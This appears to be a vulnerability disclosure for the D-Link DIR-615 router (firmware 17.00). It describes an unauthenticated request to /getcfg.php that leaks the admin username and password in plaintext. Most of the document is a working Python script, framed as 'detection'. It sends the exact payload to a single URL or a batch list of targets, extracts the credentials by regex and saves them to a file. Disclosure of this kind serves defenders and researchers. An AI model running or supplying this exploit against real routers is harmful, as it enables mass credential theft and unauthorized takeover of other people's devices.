# D-LINK-DIR-615
## Sensitive information disclosure vulnerability in D-Link dir-615 Hardware Version : Q1 Firmware Version : 17.00

Sensitive information disclosure vulnerability exists in D-Link dir-615 Hardware Version : Q1 Firmware Version : 17.00. An attacker can obtain a user name and password by forging a post request to the / getcfg.php page


## harm

An attacker can access this page without authorization, obtain the user name and password in plaintext, and obtain background management privileges after logging in to the background


## Test method
1. Visit the d-link-dir-615 background login page

![image](https://user-images.githubusercontent.com/90023952/131967300-7de24cb6-2c48-4c29-9e80-c89ca244ccd4.png)

2. Enter any password, then grab the packet and modify the packet content as follows

![image](https://user-images.githubusercontent.com/90023952/131959930-bdc051b1-e234-4803-972d-adf58ddeb554.png)

![image](https://user-images.githubusercontent.com/90023952/131970186-aa50bc1f-8fea-44ab-b555-bbc0734409db.png)

3.Use the obtained user name and password to successfully log in to the background

![image](https://user-images.githubusercontent.com/90023952/131967546-aedaccf8-c7e6-45a2-aad3-3b30c0869a6a.png)

## Script automation detection

```
import requests
import argparse
import re
import urllib3
urllib3.disable_warnings()
parser = argparse.ArgumentParser(description='api help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
parser.add_argument('-r','--read', help='Please Input a file!',default='')
args=parser.parse_args()
url=args.url
file=args.read

if url !="":
    url=url+"/getcfg.php"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
    "Cookie":"",
    "X-Forwarded-For":"127.0.0.1"
            }
    data = ("SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a")
    response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
    print(response.text)
    if  "DEVICE.ACCOUNT" in response.text and response.status_code == 200:
        print("[" + url + "]" + "[===dangerous===]")
    else:
        print("["+url+"]"+"[safe]")

if file !="":
    txt=file
    f=open(txt,'r+')
    for i in f.readlines():
        url=i.strip()
        url=url+"/getcfg.php"
        header={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"",
        "X-Forwarded-For": "127.0.0.1"
        }
        data = ("SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a")
        try:
            response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
            if "DEVICE.ACCOUNT" in response.text and response.status_code == 200:
                name = re.findall('<name>.*', response.text)
                password = re.findall('<password>.*', response.text)
                print("[" + url + "]" + "[===dangerous===]")
                w = open("DIR-615-Vulnerability-file.txt", "a")
                w.write(url + '\r\n' + repr(name) + repr(password) + '\r\n')
            else:
                print("[" + url + "]" + "[safe]")
        except Exception as e:
            print("["+url+"]"+"[safe]",format(e))


```
1. Detect a single URL

python D-LINK-DIR-615.py -u http://xxx.xxx.xxx.xxx

![image](https://user-images.githubusercontent.com/90023952/131969868-2209f5e9-31ec-4b1f-bb51-5779e6511827.png)

2. Batch inspection

python D-LINK-DIR-615.py -r file.txt

![image](https://user-images.githubusercontent.com/90023952/132079411-872f953b-edf7-49d5-9db5-56e7f8530225.png)

After the batch detection script is executed, a file named "dir-615-vulnerability-file. TXT" will be generated in the current folder, with the contents of vulnerability URL and explored user name and password

![image](https://user-images.githubusercontent.com/90023952/131964740-c30b05a7-86e2-4345-8b10-a63e82d6df98.png)


![image](https://user-images.githubusercontent.com/90023952/131964819-83b55c78-5dc5-48a7-b62a-acab7258a838.png)







